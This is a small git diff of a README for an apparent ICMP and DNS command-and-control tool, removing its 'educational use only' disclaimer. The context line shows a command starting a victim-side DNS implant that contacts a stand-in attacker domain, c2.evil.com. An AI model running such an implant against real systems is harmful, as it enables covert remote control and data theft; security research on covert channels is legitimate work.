@@ -87,9 +87,3 @@ sudo python3 DNS/victim/victim_dns.py -d c2.evil.com -s <attacker-ip>
 
 - **[ICMP/README.md](ICMP/README.md)** - Complete ICMP C2 documentation
 - **[DNS/README.md](DNS/README.md)** - Complete DNS C2 documentation
-
-## License & Disclaimer
-
-**⚠️ EDUCATIONAL USE ONLY** - For security research and authorized penetration testing only.
-
-Built with [Scapy](https://scapy.net/).
